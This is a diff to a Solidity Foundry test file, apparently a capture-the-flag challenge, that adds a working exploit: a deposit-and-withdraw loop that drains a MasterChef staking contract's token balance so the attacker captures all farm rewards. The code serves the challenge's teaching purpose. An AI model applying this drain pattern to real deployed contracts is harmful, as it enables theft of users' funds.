@@ -67,25 +67,36 @@ contract Testing is Test {
         vm.prank(adminUser);
         masterChef.deposit(0, 10_000e18);
 
-        // simulate staking over time
-        vm.roll(120); // 120 blocks
+        vm.roll(120);
     }
 
-    /// solves the challenge
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
+        mula.approve(address(masterChef), UINT256_MAX);
 
-        // implement solution here
+        uint256 attackerBalance = mula.balanceOf(attacker);
+        uint256 masterChefBalance;
 
-        vm.stopPrank();
+        while (true) {
+            masterChef.deposit(0, attackerBalance);
+            masterChefBalance = mula.balanceOf(address(masterChef));
+
+            if (masterChefBalance < attackerBalance) {
+                masterChef.withdraw(0, masterChefBalance - 1);
+                break;
+            } else {
+                masterChef.withdraw(0, attackerBalance);
+            }
+
+            attackerBalance = mula.balanceOf(attacker);
+        }
+
         validation();
     }
 
-    /// expected final state
     function validation() public {
         // attacker must receive all rewards in a single call to deposit
         vm.roll(block.number + 1);
-        vm.prank(attacker);
         masterChef.deposit(0, 1);
 
         // attacker drains all farm emissions up to this block
